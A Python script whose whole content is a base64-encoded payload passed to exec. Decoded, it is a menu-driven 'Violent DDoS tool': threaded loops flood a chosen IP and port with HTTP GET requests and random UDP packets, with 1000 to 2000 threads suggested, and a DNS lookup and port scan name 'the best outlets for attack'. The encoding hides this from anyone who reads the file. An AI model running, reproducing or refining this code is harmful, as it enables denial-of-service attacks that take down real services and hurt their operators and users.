import base64
exec(base64.b64decode('aW1wb3J0IHJhbmRvbQppbXBvcnQgc29ja2V0CmltcG9ydCB0aHJlYWRpbmcKaW1wb3J0IHN5cwpmcm9tIGNvbG9yYW1hIGltcG9ydCBGb3JlLCBTdHlsZSwgaW5pdApmcm9tIGZha2VfdXNlcmFnZW50IGltcG9ydCBVc2VyQWdlbnQKaW1wb3J0IGRucy5yZXNvbHZlcgoKaW5pdChhdXRvcmVzZXQ9VHJ1ZSkKCnVhID0gVXNlckFnZW50KCkKCmNvbG9ycyA9IFtGb3JlLlJFRCwgRm9yZS5HUkVFTiwgRm9yZS5ZRUxMT1csIEZvcmUuQkxVRSwgRm9yZS5NQUdFTlRBLCBGb3JlLkNZQU5dCgpkZWYgcmFuZG9tX2lwKCk6CiAgICByZXR1cm4gZiJ7cmFuZG9tLnJhbmRpbnQoMSwgMjU1KX0ue3JhbmRvbS5yYW5kaW50KDEsIDI1NSl9LntyYW5kb20ucmFuZGludCgxLCAyNTUpfS57cmFuZG9tLnJhbmRpbnQoMSwgMjU1KX0iCgpkZWYgaHR0cF9hdHRhY2sodGFyZ2V0X2lwLCB0YXJnZXRfcG9ydCwgZmFrZV9pcCwgc2hvd19wYWNrZXRzKToKICAgIHdoaWxlIFRydWU6CiAgICAgICAgdHJ5OgogICAgICAgICAgICBjb2xvciA9IHJhbmRvbS5jaG9pY2UoY29sb3JzKQoKICAgICAgICAgICAgc29jayA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsIHNvY2tldC5TT0NLX1NUUkVBTSkKICAgICAgICAgICAgc29jay5jb25uZWN0KCh0YXJnZXRfaXAsIHRhcmdldF9wb3J0KSkKCiAgICAgICAgICAgIG1zZyA9IGYiR0VUIC8gSFRUUC8xLjFcclxuSG9zdDoge3RhcmdldF9pcH1cclxuVXNlci1BZ2VudDoge3VhLnJhbmRvbX1cclxuXHJcbiIuZW5jb2RlKCdhc2NpaScpCiAgICAgICAgICAgIHNvY2suc2VuZChtc2cpCgogICAgICAgICAgICBpZiBzaG93X3BhY2tldHM6CiAgICAgICAgICAgICAgICBwcmludChjb2xvciArIGYiWytdIGF0dGFja3MgSFRUUCBvbiB7dGFyZ2V0X2lwfTp7dGFyZ2V0X3BvcnR9IGZyb20gSVAgSW1hZ2luYXJ5IHtmYWtlX2lwfSAtIFVzZXItQWdlbnQ6IHt1YS5yYW5kb219IiArIFN0eWxlLlJFU0VUX0FMTCkKCiAgICAgICAgICAgIHNvY2suY2xvc2UoKQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyBmIlstXSBFcnJvciBkdXJpbmcgYXR0YWNrOiB7ZX0iICsgU3R5bGUuUkVTRVRfQUxMKQogICAgICAgICAgICBjb250aW51ZQpkZWYgdWRwX2F0dGFjayh0YXJnZXRfaXAsIHRhcmdldF9wb3J0LCBzaG93X3BhY2tldHMpOgogICAgd2hpbGUgVHJ1ZToKICAgICAgICB0cnk6CiAgICAgICAgICAgIGNvbG9yID0gcmFuZG9tLmNob2ljZShjb2xvcnMpCiAgICAgICAgICAgIHNvY2sgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19ER1JBTSkKICAgICAgICAgICAgc29jay5zZXRzb2Nrb3B0KHNvY2tldC5TT0xfU09DS0VULCBzb2NrZXQuU09fUkVVU0VBRERSLCAxKQogICAgICAgICAgICBtc2cgPSByYW5kb20uX3VyYW5kb20oMTAyNCkgIAogICAgICAgICAgICBzb2NrLnNlbmR0byhtc2csICh0YXJnZXRfaXAsIHRhcmdldF9wb3J0KSkKCiAgICAgICAgICAgIGlmIHNob3dfcGFja2V0czoKICAgICAgICAgICAgICAgIHByaW50KGNvbG9yICsgZiJbK11VRFAgcGFja2V0IHNlbnQgdG8ge3RhcmdldF9pcH06e3RhcmdldF9wb3J0fSIgKyBTdHlsZS5SRVNFVF9BTEwpCgogICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyBmIlstXUVycm9yIHdoaWxlIHNlbmRpbmcgVURQIHBhY2tldDoge2V9IiArIFN0eWxlLlJFU0VUX0FMTCkKICAgICAgICAgICAgY29udGludWUKCmRlZiBzdGFydF9hdHRhY2sodGFyZ2V0X2lwLCB0YXJnZXRfcG9ydCwgZmFrZV9pcCwgdGhyZWFkcywgc2hvd19wYWNrZXRzKToKICAgIGZvciBpIGluIHJhbmdlKHRocmVhZHMgLy8gMik6CiAgICAgICAgdGhyZWFkID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9aHR0cF9hdHRhY2ssIGFyZ3M9KHRhcmdldF9pcCwgdGFyZ2V0X3BvcnQsIGZha2VfaXAsIHNob3dfcGFja2V0cykpCiAgICAgICAgdGhyZWFkLmRhZW1vbiA9IFRydWUKICAgICAgICB0aHJlYWQuc3RhcnQoKQoKICAgIGZvciBpIGluIHJhbmdlKHRocmVhZHMgLy8gMik6CiAgICAgICAgdGhyZWFkID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9dWRwX2F0dGFjaywgYXJncz0odGFyZ2V0X2lwLCB0YXJnZXRfcG9ydCwgc2hvd19wYWNrZXRzKSkKICAgICAgICB0aHJlYWQuZGFlbW9uID0gVHJ1ZQogICAgICAgIHRocmVhZC5zdGFydCgpCgpkZWYgZ2V0X2lwX2FuZF9wb3J0cyhkb21haW4pOgogICAgdHJ5OgogICAgICAgIGlmIGRvbWFpbi5zdGFydHN3aXRoKCJodHRwOi8vIik6CiAgICAgICAgICAgIGRvbWFpbiA9IGRvbWFpbltsZW4oImh0dHA6Ly8iKTpdCiAgICAgICAgZWxpZiBkb21haW4uc3RhcnRzd2l0aCgiaHR0cHM6Ly8iKToKICAgICAgICAgICAgZG9tYWluID0gZG9tYWluW2xlbigiaHR0cHM6Ly8iKTpdCgogICAgICAgIGRvbWFpbiA9IGRvbWFpbi5zcGxpdCgnLycpWzBdCgogICAgICAgIGFuc3dlcnMgPSBkbnMucmVzb2x2ZXIucmVzb2x2ZShkb21haW4sICdBJykKICAgICAgICB0YXJnZXRfaXAgPSBhbnN3ZXJzWzBdLnRvX3RleHQoKQogICAgICAgIHByaW50KEZvcmUuR1JFRU4gKyBmIlsrXSBJUCBGb3IgdGhlIHNpdGUge2RvbWFpbn06IHt0YXJnZXRfaXB9IikKCiAgICAgICAgY29tbW9uX3BvcnRzID0gWzIxLCAyMiwgMjMsIDI1LCA1MywgODAsIDExMCwgMTQzLCA0NDMsIDMzMDYsIDgwODBdCiAgICAgICAgb3Blbl9wb3J0cyA9IFtdCgogICAgICAgIHByaW50KEZvcmUuWUVMTE9XICsgIlsqXSBTY2FubmluZyBjb21tb24gcG9ydHMuLi4iKQoKICAgICAgICBmb3IgcG9ydCBpbiBjb21tb25fcG9ydHM6CiAgICAgICAgICAgIHNvY2sgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pCiAgICAgICAgICAgIHNvY2suc2V0dGltZW91dCgxKSAgCiAgICAgICAgICAgIHJlc3VsdCA9IHNvY2suY29ubmVjdF9leCgodGFyZ2V0X2lwLCBwb3J0KSkKICAgICAgICAgICAgaWYgcmVzdWx0ID09IDA6CiAgICAgICAgICAgICAgICBvcGVuX3BvcnRzLmFwcGVuZChwb3J0KQogICAgICAgICAgICBzb2NrLmNsb3NlKCkKCiAgICAgICAgaWYgb3Blbl9wb3J0czoKICAgICAgICAgICAgcHJpbnQoRm9yZS5HUkVFTiArIGYiWytdIE9wZW4gcG9ydHMgb24ge3RhcmdldF9pcH06IHsnLCAnLmpvaW4obWFwKHN0ciwgb3Blbl9wb3J0cykpfSIpCiAgICAgICAgZWxzZToKICAgICAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAiWy1dTm8gb3BlbiBwb3J0cyBmb3VuZC4iKQoKICAgICAgICByZXR1cm4gdGFyZ2V0X2lwLCBvcGVuX3BvcnRzCgogICAgZXhjZXB0IChkbnMucmVzb2x2ZXIuTlhET01BSU4sIGRucy5yZXNvbHZlci5Ob0Fuc3dlciwgZG5zLnJlc29sdmVyLk5vTmFtZXNlcnZlcnMsIHNvY2tldC5nYWllcnJvcik6CiAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAiWy1dRXJyb3I6IFNpdGUgSVAgbm90IGZvdW5kLiBDaGVjayB0aGUgbGluay4iKQogICAgICAgIHJldHVybiBOb25lLCBbXQoKZGVmIG1haW5fbWVudSgpOgogICAgcHJpbnQoRm9yZS5DWUFOICsgIj09PT09PT09PT09PT09PT09PT09PT09PT0iKQogICAgcHJpbnQoRm9yZS5DWUFOICsgIiAgICAgIFZpb2xlbnQgRERvUyB0b29sICAgICAgIikKICAgIHByaW50KEZvcmUuQ1lBTiArICI9PT09PT09PT09PT09PT09PT09PT09PT09IikKICAgIHByaW50KEZvcmUuR1JFRU4gKyAiWzFdIFRhcmdldGluZyBhIHNwZWNpZmljIElQIikKICAgIHByaW50KEZvcmUuR1JFRU4gKyAiWzJdIFRhcmdldGluZyB1c2luZyBhIHJhbmRvbSBmYWtlIElQIikKICAgIHByaW50KEZvcmUuWUVMTE9XICsgIlszXSBPYnRhaW4gdGhlIGxvY2F0aW9uIElQIGFuZCB0aGUgYmVzdCBwb3J0cyB0byBhdHRhY2siKQogICAgcHJpbnQoRm9yZS5SRUQgKyAiWzBdZGVwYXJ0dXJlIikKICAgIHByaW50KEZvcmUuQ1lBTiArICI9PT09PT09PT09PT09PT09PT09PT09PT09IikKCmRlZiBtYWluKCk6CiAgICB3aGlsZSBUcnVlOgogICAgICAgIG1haW5fbWVudSgpCiAgICAgICAgdHJ5OgogICAgICAgICAgICBjaG9pY2UgPSBpbnQoaW5wdXQoRm9yZS5ZRUxMT1cgKyAiQ2hvb3NlIGFuIG9wdGlvbjogIiArIFN0eWxlLlJFU0VUX0FMTCkpCgogICAgICAgICAgICBpZiBjaG9pY2UgPT0gMToKICAgICAgICAgICAgICAgIHRhcmdldF9pcCA9IGlucHV0KEZvcmUuWUVMTE9XICsgIkVudGVyIHRoZSB0YXJnZXQgSVA6ICIgKyBTdHlsZS5SRVNFVF9BTEwpCiAgICAgICAgICAgICAgICB0YXJnZXRfcG9ydCA9IGludChpbnB1dChGb3JlLllFTExPVyArICJFbnRlciB0aGUgcG9ydDogIiArIFN0eWxlLlJFU0VUX0FMTCkpCiAgICAgICAgICAgICAgICBmYWtlX2lwID0gaW5wdXQoRm9yZS5ZRUxMT1cgKyAiRW50ZXIgYSBkdW1teSBJUCAob3IgdHlwZSAncmFuZG9tJyB0byBnZXQgYSByYW5kb20gSVApOiAiICsgU3R5bGUuUkVTRVRfQUxMKQoKICAgICAgICAgICAgICAgIGlmIGZha2VfaXAubG93ZXIoKSA9PSAncmFuZG9tJzoKICAgICAgICAgICAgICAgICAgICBmYWtlX2lwID0gcmFuZG9tX2lwKCkKCiAgICAgICAgICAgICAgICB0aHJlYWRzID0gaW50KGlucHV0KEZvcmUuWUVMTE9XICsgIkVudGVyIHRoZSBudW1iZXIgb2YgVGhyZWFkcyAocHJlZmVyYWJseSBiZXR3ZWVuIDEwMDAtMjAwMCk6ICIgKyBTdHlsZS5SRVNFVF9BTEwpKQogICAgICAgICAgICAgICAgc2hvd19wYWNrZXRzID0gaW5wdXQoRm9yZS5ZRUxMT1cgKyAiV291bGQgeW91IGxpa2UgdG8gdmlldyBldmVyeSBwYWNrYWdlIHNlbnQ/ICh5ZXMvbm8pOiAiICsgU3R5bGUuUkVTRVRfQUxMKS5sb3dlcigpID09ICdZZXMnCgogICAgICAgICAgICAgICAgc3RhcnRfYXR0YWNrKHRhcmdldF9pcCwgdGFyZ2V0X3BvcnQsIGZha2VfaXAsIHRocmVhZHMsIHNob3dfcGFja2V0cykKCiAgICAgICAgICAgIGVsaWYgY2hvaWNlID09IDI6CiAgICAgICAgICAgICAgICB0YXJnZXRfaXAgPSBpbnB1dChGb3JlLllFTExPVyArICJFbnRlciB0aGUgdGFyZ2V0IElQOiAiICsgU3R5bGUuUkVTRVRfQUxMKQogICAgICAgICAgICAgICAgdGFyZ2V0X3BvcnQgPSBpbnQoaW5wdXQoRm9yZS5ZRUxMT1cgKyAiRW50ZXIgdGhlIHBvcnQoUG9ydCk6ICIgKyBTdHlsZS5SRVNFVF9BTEwpKQogICAgICAgICAgICAgICAgdGhyZWFkcyA9IGludChpbnB1dChGb3JlLllFTExPVyArICJFbnRlciB0aGUgbnVtYmVyIG9mIFRocmVhZHMgKHByZWZlcmFibHkgYmV0d2VlbiAxMDAwLTIwMDApOiAiICsgU3R5bGUuUkVTRVRfQUxMKSkKICAgICAgICAgICAgICAgIHNob3dfcGFja2V0cyA9IGlucHV0KEZvcmUuWUVMTE9XICsgIldvdWxkIHlvdSBsaWtlIHRvIHZpZXcgZXZlcnkgcGFja2FnZSBzZW50PyAoeWVzL25vKTogIiArIFN0eWxlLlJFU0VUX0FMTCkubG93ZXIoKSA9PSAnWWVzJwoKICAgICAgICAgICAgICAgIGZha2VfaXAgPSByYW5kb21faXAoKQoKICAgICAgICAgICAgICAgIHN0YXJ0X2F0dGFjayh0YXJnZXRfaXAsIHRhcmdldF9wb3J0LCBmYWtlX2lwLCB0aHJlYWRzLCBzaG93X3BhY2tldHMpCgogICAgICAgICAgICBlbGlmIGNob2ljZSA9PSAzOgogICAgICAgICAgICAgICAgZG9tYWluID0gaW5wdXQoRm9yZS5ZRUxMT1cgKyAiRW50ZXIgdGhlIGxpbmsgKGRvbWFpbikgZm9yIHRoZSBzaXRlOiAiICsgU3R5bGUuUkVTRVRfQUxMKQogICAgICAgICAgICAgICAgdGFyZ2V0X2lwLCBvcGVuX3BvcnRzID0gZ2V0X2lwX2FuZF9wb3J0cyhkb21haW4pCgogICAgICAgICAgICAgICAgaWYgdGFyZ2V0X2lwIGFuZCBvcGVuX3BvcnRzOgogICAgICAgICAgICAgICAgICAgIHByaW50KEZvcmUuR1JFRU4gKyBmIlsrXVlvdSBjYW4gdXNlIHRoaXMgSVA6IHt0YXJnZXRfaXB9IHRvIGF0dGFjay4iKQogICAgICAgICAgICAgICAgICAgIHByaW50KEZvcmUuR1JFRU4gKyBmIlsrXSBUaGUgYmVzdCBvdXRsZXRzIGZvciBhdHRhY2sgYXJlOiB7JywgJy5qb2luKG1hcChzdHIsIG9wZW5fcG9ydHMpKX0iKQoKICAgICAgICAgICAgZWxpZiBjaG9pY2UgPT0gMDoKICAgICAgICAgICAgICAgIHByaW50KEZvcmUuR1JFRU4gKyAiRXhpdC4uLiBUaGFuayB5b3UgZm9yIHVzaW5nIHRoZSB0b29sISIpCiAgICAgICAgICAgICAgICBzeXMuZXhpdCgpCgogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAiSW52YWxpZCBvcHRpb24hIFRyeSBhZ2Fpbi4iKQoKICAgICAgICBleGNlcHQgVmFsdWVFcnJvcjoKICAgICAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAiRW50ZXIgYSB2YWxpZCBudW1iZXIgb2Ygb3B0aW9ucy4iKQoKaWYgX19uYW1lX18gPT0gIl9fbWFpbl9fIjoKICAgIG1haW4oKQo=').decode())
